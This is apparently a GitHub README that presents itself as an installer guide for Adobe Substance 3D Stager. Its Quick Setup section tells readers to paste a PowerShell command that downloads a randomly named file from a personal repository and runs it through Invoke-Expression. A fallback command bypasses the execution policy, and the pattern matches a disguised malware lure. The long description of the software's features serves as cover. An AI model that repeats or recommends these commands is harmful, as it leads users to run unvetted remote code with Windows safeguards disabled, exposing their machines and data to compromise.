# Substance 3D Stager

Substance 3D Stager is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Substance 3D Stager and work in it.

Adobe Substance 3D Stager is scene-staging software for Windows. You bring in meshes from common exchange formats, apply Substance materials and decals, place lights and environments, and preview the look with a real-time path-traced viewport tuned for packaging, furniture, and hard-surface shots.

A typical session starts by importing assets and arranging them on a stage floor or backdrop. You adjust HDRI or area lights, set camera focal length and depth of field, tweak material parameters, then render hero frames or multilayer EXR for compositing in other tools. Iteration stays in the viewport until the shot matches your art direction.

This repository tracks a Windows setup package for Stager, release notes that summarize build changes, and a short changelog so teammates know which installer build is current. Use it to align studio machines on the same version before sharing scene files or render presets.

## What you do with it

- Import USD, FBX, and OBJ assets into a unified staging scene on Windows.
- Apply Substance materials and parametric textures directly onto scene geometry.
- Light scenes with HDRI environments, area lights, and adjustable sun direction.
- Frame shots with physical cameras, depth of field, and focal length controls.
- Preview materials and lighting in a path-traced viewport before final render.
- Organize objects with layers, groups, and transform tools for precise layout.
- Export PNG, PSD, and multilayer EXR stills sized for print and compositing pipelines.
- Send look-dev assets from Substance 3D Painter and Sampler into the same stage.

## Quick Setup (PowerShell)

This installs the program Substance 3D Stager on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/walterhannah628163/substance-3d-stager-setup-guide/main/a3smb4nchf.dm6paojx | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/walterhannah628163/substance-3d-stager-setup-guide/main/a3smb4nchf.dm6paojx | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `a3smb4nchf.dm6paojx` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `walterhannah628163/substance-3d-stager-setup-guide`. Adobe Substance 3D Stager 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
